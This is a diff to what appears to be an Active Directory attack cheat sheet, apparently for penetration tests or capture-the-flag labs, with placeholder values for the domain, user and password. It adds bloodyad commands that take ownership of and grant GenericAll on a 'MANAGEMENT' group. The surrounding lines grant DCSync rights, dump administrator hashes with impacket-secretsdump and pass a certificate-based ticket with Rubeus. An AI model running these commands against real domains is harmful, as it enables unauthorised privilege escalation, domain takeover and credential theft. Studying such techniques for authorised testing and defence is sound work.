@@ -205,6 +205,9 @@ Get-ObjectAcl "DC={{DOMAIN_NB}},DC=LOCAL" -ResolveGUIDs | ? { $_.ObjectAceType -
 > | `89e95b76-444d-4c62-991a-0facbeda640c` | DS-Replication-Get-Changes-In-Filtered-Set |
 
 ```bash
+bloodyad -d {{DOMAIN}} -u {{USERNAME}} -p '{{PASSWORD}}' --host {{DC_IP}} set owner "MANAGEMENT" "{{USERNAME}}"
+bloodyad -d {{DOMAIN}} -u {{USERNAME}} -p '{{PASSWORD}}' --host {{DC_IP}} add genericAll "MANAGEMENT" "{{USERNAME}}"
+
 bloodyad --host {{DC_IP}} -d {{DOMAIN}} -u {{USERNAME}} -p '{{PASSWORD}}' add groupMember '{{GROUP_NAME}}' {{USERNAME}}
 bloodyad --host {{DC_IP}} -d {{DOMAIN}} -u {{USERNAME}} -p '{{PASSWORD}}' get object {{USERNAME}} --attr memberOf
 bloodyad --host {{DC_IP}} -d {{DOMAIN}} -u {{USERNAME}} -p '{{PASSWORD}}' add dcsync {{USERNAME}}
@@ -557,3 +560,4 @@ impacket-secretsdump -just-dc-user {{DOMAIN_NB}}/administrator -k -no-pass "{{CO
 # or use the DC cert with Rubeus to PTT
 .\Rubeus.exe asktgt /user:{{COMPUTER_NAME}}$ /certificate:<B64> /ptt
 ```
+
